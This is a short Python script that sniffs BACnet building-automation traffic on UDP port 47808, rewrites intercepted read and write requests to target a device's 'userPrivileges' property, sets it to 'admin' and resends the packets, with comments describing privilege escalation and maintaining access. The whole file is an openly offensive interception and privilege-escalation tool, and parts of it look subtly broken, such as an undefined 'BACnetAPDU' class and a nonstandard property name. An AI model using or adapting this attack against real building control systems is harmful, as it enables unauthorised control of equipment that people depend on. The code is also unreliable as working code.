from scapy.all import *
from bacpypes.pdu import Address
from bacpypes.apdu import ReadPropertyRequest, WritePropertyRequest
from bacpypes.constructeddata import ArrayOf
from bacpypes.primitivedata import CharacterString
    
def intercept_and_modify(packet):
    if BACnetAPDU in packet:
        apdu = packet[BACnetAPDU]
        if isinstance(apdu, ReadPropertyRequest):
            print(f"Intercepted ReadPropertyRequest from {packet[IP].src}")
            # Modify the request to privesc
            apdu.objectIdentifier = ('device', 1234)  # Change to target device ID
            apdu.propertyIdentifier = 'userPrivileges'  # Change to target property
            apdu.propertyArrayIndex = None
            print(f"Modified ReadPropertyRequest to target userPrivileges of device 1234")
        elif isinstance(apdu, WritePropertyRequest):
            print(f"Intercepted WritePropertyRequest from {packet[IP].src}")
            # Modify the request to maintain access
            apdu.objectIdentifier = ('device', 1234)  # Change to target device ID
            apdu.propertyIdentifier = 'userPrivileges'  # Change to target property
            apdu.propertyValue = ArrayOf(CharacterString)(['admin'])  # Escalate to admin
            print(f"Modified WritePropertyRequest to escalate privileges to admin")
        # Send modified packet back to the network
        send(packet)

# Sniff BACnet traffic on the network
sniff(filter="udp port 47808", prn=intercept_and_modify)
